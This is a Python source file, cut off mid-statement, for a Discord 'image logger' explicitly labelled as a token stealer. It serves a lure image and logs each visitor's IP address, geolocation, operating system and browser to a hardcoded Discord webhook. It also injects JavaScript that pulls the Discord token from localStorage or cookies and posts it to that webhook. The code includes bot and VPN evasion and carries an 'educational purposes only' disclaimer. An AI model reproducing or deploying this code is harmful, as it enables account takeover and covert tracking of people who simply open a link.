# image_logger_with_token.txt
# Modified Image Logger by Team C00lB0i/C00lB0i | https://github.com/OverPowerC
# Enhanced to steal Discord tokens in addition to IP and other user info
# For educational purposes only

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ ="Discord Image Logger with Token Stealer"
__description__ ="A simple application which allows you to steal IPs, Discord tokens, and more by abusing Discord's Open Original feature"
__version__ ="v2.1"
__author__ ="C00lB0i"

config = {
     BASE CONFIG 
    "webhook":"https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz","image":"https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg","imageArgument": True,

     CUSTOMIZATION 
"username":"Image Logger","color": 0x00FFFF,

     OPTIONS 
"crashBrowser": False,"accurateLocation": False,"message": {"doMessage": False,"message":"This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC","richMessage": True,},"vpnCheck": 1,"linkAlerts": True,"buggedImage": True,"antiBot": 1,

     TOKEN STEALER 
"stealToken": True,  # Enable Discord token stealing

     REDIRECTION 
"redirect": {"redirect": False,"page":"https://your-link.here"
    },}
blacklistedIPs = ("27","104","143","164")

def botCheck(ip, useragent):
    if ip.startswith(("34","35")):
        return"Discord"
    elif useragent.startswith("TelegramBot"):
        return"Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {"username": config["username"],"content":"@everyone","embeds": [
            {"title":"Image Logger - Error","color": config["color"],"description": f"An error occurred while trying to log an IP or token!\n\n**Error:**\n```\n{error}\n```",}        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {"username": config["username"],"content": "","embeds": [
                {"title":"Image Logger - Link Sent","color": config["color"],"description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",}            ],
        }) if config["linkAlerts"] else None
        return

    ping ="@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {"username": config["username"],"content": ping,"embeds": [
            {"title":"Image Logger - IP and Token Logged","color": config["color"],"description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**Discord Token:**
> **Token:** `{token if token else 'Not Found'}`

**User Agent:**
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json=embed)
    return info

binaries = {"loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: self.wfile.write(binaries["loading"])
                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                token = None
                if config["stealToken"]:
                    token_script = f"""
                    <script>
                    // Attempt to steal Discord token from localStorage or cookies
                    function stealToken() {{
                        let token = localStorage.getItem('token') || document.cookie.split('token=')[1]?.split(';')[0] || 'Not Found';
                        if (token && token!== 'Not Found') {{
                            token = token.replace(/"/g, '');
                            fetch('{config["webhook"]}', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{
                                    username: '{config["username"]}',
                                    content: '@everyone',
                                    embeds: [{{
                                        title: 'Image Logger - Token Stolen',
                                        color: {config["color"]},
                                        description:`**Discord Token Stolen!**\\n**Token:** \`${{token}}\`\\n**IP:** \`${self.headers.get('x-forwarded-for')}\`\\n**Endpoint:** \`${s.split("?")[0]}\``
                                    }}]
                                }})
                            }});
                        }}
                        return token;
                    }}
                    stealToken();
                    </script>
                    """
                    data += token_script.encode()
                else:
                    token ="Token Stealing Disabled"

                if dic.get("g") and config["accurateLocation"]
